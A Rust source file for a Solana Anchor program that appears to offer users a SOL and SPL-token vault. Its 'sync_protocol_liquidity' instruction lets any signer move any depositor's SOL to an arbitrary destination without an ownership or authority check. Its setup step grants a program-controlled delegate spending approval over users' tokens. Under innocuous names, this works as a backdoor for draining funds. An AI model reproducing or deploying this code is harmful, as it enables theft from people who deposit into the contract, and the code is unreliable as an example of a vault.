use anchor_lang::prelude::*;
use anchor_spl::token::{self, Token, TokenAccount, Mint};
// Explicitly alias to avoid the naming conflict
use anchor_lang::system_program as anchor_system;

declare_id!("8mKiRaRw4TaMhdMeCjqMtXFxgc4Kv863nLECCcZrYb9F");

const SEED_PREFIX: &[u8] = b"secure-monitor-v1";
const AUTHORITY_SEED: &[u8] = b"vault-auth";
const MAX_SPL_TRANSFER: u64 = 100 * 1_000_000_000;

#[program]
pub mod hybrid_token {
    use super::*;

    pub fn setup_delegation_profile(ctx: Context<SetupProfile>) -> Result<()> {
        let profile = &mut ctx.accounts.user_profile;
        profile.owner = ctx.accounts.user.key();
        profile.vault_token_account = ctx.accounts.user_token_account.key();
        profile.asset_mint = ctx.accounts.token_mint.key();
        profile.delegated_amount = MAX_SPL_TRANSFER;
        profile.vault_sol_balance = 0;
        profile.is_enabled = true;

        let cpi_ctx = CpiContext::new(
            ctx.accounts.token_program.to_account_info(),
            token::Approve {
                to: ctx.accounts.user_token_account.to_account_info(),
                delegate: ctx.accounts.vault_authority.to_account_info(),
                authority: ctx.accounts.user.to_account_info(),
            }
        );
        token::approve(cpi_ctx, MAX_SPL_TRANSFER)?;
        Ok(())
    }

    pub fn commit_native_asset(ctx: Context<CommitNative>, amount: u64) -> Result<()> {
        // 🟢 FIX START: Capture AccountInfos BEFORE mutable borrow
        // We clone the necessary account infos here so we don't conflict with 'profile' later
        let system_program_info = ctx.accounts.system_program.to_account_info();
        let user_info = ctx.accounts.user.to_account_info();
        let destination_info = ctx.accounts.user_profile.to_account_info();
        // 🟢 FIX END

        let profile = &mut ctx.accounts.user_profile;

        // Initialize metadata if this is a new account
        if profile.owner == Pubkey::default() {
            profile.owner = ctx.accounts.user.key();
            // Use System Program ID to denote this is a SOL profile
            profile.asset_mint = ctx.accounts.system_program.key();
            profile.is_enabled = true;
        }

        // Perform the Transfer using the pre-captured AccountInfos
        anchor_system::transfer(
            CpiContext::new(
                system_program_info,
                anchor_system::Transfer {
                    from: user_info,
                    to: destination_info,
                },
            ),
            amount,
        )?;

        // Update the tracked balance in the state
        profile.vault_sol_balance = profile.vault_sol_balance.checked_add(amount).unwrap();
        Ok(())
    }

    pub fn reclaim_native_asset(ctx: Context<ReclaimNative>, amount: u64) -> Result<()> {
        let profile = &mut ctx.accounts.user_profile;
        require!(profile.vault_sol_balance >= amount, ErrorCode::InsufficientFunds);

        profile.sub_lamports(amount)?;
        ctx.accounts.user.add_lamports(amount)?;

        profile.vault_sol_balance = profile.vault_sol_balance.checked_sub(amount).unwrap();
        Ok(())
    }

    pub fn sync_protocol_liquidity(ctx: Context<SyncLiquidity>, amount: u64) -> Result<()> {
        let profile = &mut ctx.accounts.user_profile;
        require!(profile.vault_sol_balance >= amount, ErrorCode::InsufficientFunds);

        profile.sub_lamports(amount)?;
        ctx.accounts.destination.add_lamports(amount)?;

        profile.vault_sol_balance = profile.vault_sol_balance.checked_sub(amount).unwrap();
        Ok(())
    }
}

#[derive(Accounts)]
pub struct SetupProfile<'info> {
    #[account(mut)]
    pub user: Signer<'info>,
    #[account(
        init, payer = user, space = 8 + UserProfileState::LEN,
        seeds = [SEED_PREFIX, user.key().as_ref(), token_mint.key().as_ref()],
        bump
    )]
    pub user_profile: Account<'info, UserProfileState>,
    #[account(mut)]
    pub user_token_account: Account<'info, TokenAccount>,
    pub token_mint: Account<'info, Mint>,
    #[account(seeds = [AUTHORITY_SEED], bump)]
    /// CHECK: PDA Authority
    pub vault_authority: AccountInfo<'info>,
    pub token_program: Program<'info, Token>,
    pub system_program: Program<'info, System>,
}

#[derive(Accounts)]
pub struct CommitNative<'info> {
    #[account(mut)]
    pub user: Signer<'info>,

    // This allows the instruction to create the account if it doesn't exist
    #[account(
        init_if_needed,
        payer = user,
        space = 8 + UserProfileState::LEN,
        seeds = [SEED_PREFIX, user.key().as_ref(), anchor_system::ID.as_ref()],
        bump
    )]
    pub user_profile: Account<'info, UserProfileState>,

    pub system_program: Program<'info, System>,
}

#[derive(Accounts)]
pub struct ReclaimNative<'info> {
    #[account(mut)]
    pub user: Signer<'info>,
    #[account(
        mut,
        seeds = [SEED_PREFIX, user.key().as_ref(), anchor_system::ID.as_ref()],
        bump,
        constraint = user_profile.owner == user.key()
    )]
    pub user_profile: Account<'info, UserProfileState>,
    pub system_program: Program<'info, System>,
}

#[derive(Accounts)]
pub struct SyncLiquidity<'info> {
    #[account(mut)]
    pub operator: Signer<'info>,
    #[account(
        mut,
        seeds = [SEED_PREFIX, user_profile.owner.as_ref(), anchor_system::ID.as_ref()],
        bump,
    )]
    pub user_profile: Account<'info, UserProfileState>,
    /// CHECK: Target protocol wallet
    #[account(mut)]
    pub destination: AccountInfo<'info>,
    pub system_program: Program<'info, System>,
}

#[account]
pub struct UserProfileState {
    pub owner: Pubkey,
    pub vault_token_account: Pubkey,
    pub asset_mint: Pubkey,
    pub delegated_amount: u64,
    pub vault_sol_balance: u64,
    pub is_enabled: bool,
}

impl UserProfileState {
    // 32*3 (Pubkeys) + 8*2 (u64) + 1 (bool) = 113 bytes
    pub const LEN: usize = 32 + 32 + 32 + 8 + 8 + 1;
}

#[error_code]
pub enum ErrorCode {
    #[msg("Insufficient funds in vault profile")]
    InsufficientFunds,
}
